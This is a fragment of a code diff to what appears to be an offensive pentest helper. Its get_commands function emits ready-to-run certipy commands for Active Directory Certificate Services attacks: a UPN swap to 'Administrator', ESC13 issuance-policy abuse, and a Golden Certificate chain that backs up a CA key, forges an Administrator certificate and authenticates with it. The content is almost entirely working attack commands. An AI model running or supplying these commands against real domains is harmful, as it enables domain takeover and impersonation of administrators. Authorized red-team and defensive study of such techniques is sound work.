-                    f"certipy-ad account update -u '{A}@{D}' -p '{PASS}' -user '<VICTIM>' -upn '<ORIGINAL_UPN>' -dc-ip {DC}",
-                    f"certipy-ad auth -pfx '<VICTIM>.pfx' -domain {D} -dc-ip {DC}",
+                    f"certipy account update -u '{A}@{D}' -p '{PASS}' -user '<VICTIM>' -upn 'Administrator' -dc-ip {DC}",
+                    f"certipy req -u '<VICTIM>@{D}' -p '<VICTIM_PASS>' -ca '<CA_NAME>' -template '{T}' -dc-ip {DC}",
+                    f"certipy account update -u '{A}@{D}' -p '{PASS}' -user '<VICTIM>' -upn '<ORIGINAL_UPN>' -dc-ip {DC}",
+                    f"certipy auth -pfx '<VICTIM>.pfx' -domain {D} -dc-ip {DC}",
                 ],
             ), na
 
@@ -576,8 +864,8 @@ def get_commands(
             return CommandSet(
                 "ADCS ESC13 — issuance policy linked to a group. Cert auth grants implicit group membership.",
                 [
-                    f"certipy-ad req -u '{A}@{D}' -p '{PASS}' -ca '<CA_NAME>' -template '{T}' -dc-ip {DC}",
-                    f"certipy-ad auth -pfx '{A}.pfx' -domain {D} -dc-ip {DC}",
+                    f"certipy req -u '{A}@{D}' -p '{PASS}' -ca '<CA_NAME>' -template '{T}' -dc-ip {DC}",
+                    f"certipy auth -pfx '{A}.pfx' -domain {D} -dc-ip {DC}",
                 ],
             ), na
 
@@ -586,10 +874,10 @@ def get_commands(
                 f"Golden Certificate — CA private key compromise on {TF}. Forge any user/computer cert offline.",
                 [
                     "# 1. Extract CA cert+key from a compromised CA host (mimikatz/SharpDPAPI/certipy):",
-                    f"certipy-ad ca -backup -u '{A}@{D}' -p '{PASS}' -ca '{T}' -dc-ip {DC}",
+                    f"certipy ca -backup -u '{A}@{D}' -p '{PASS}' -ca '{T}' -dc-ip {DC}",
                     "# 2. Forge a cert as Administrator:",
-                    f"certipy-ad forge -ca-pfx '{T}.pfx' -upn 'Administrator@{D}' -subject 'CN=Administrator,CN=Users,{_fqdn_to_dn(D)}'",
-                    f"certipy-ad auth -pfx 'administrator.pfx' -domain {D} -dc-ip {DC}",
+                    f"certipy forge -ca-pfx '{T}.pfx' -upn 'Administrator@{D}' -subject 'CN=Administrator,CN=Users,{_fqdn_to_dn(D)}'",
+                    f"certipy auth -pfx 'administrator.pfx' -domain {D} -dc-ip {DC}",
                 ],
             ), na
 
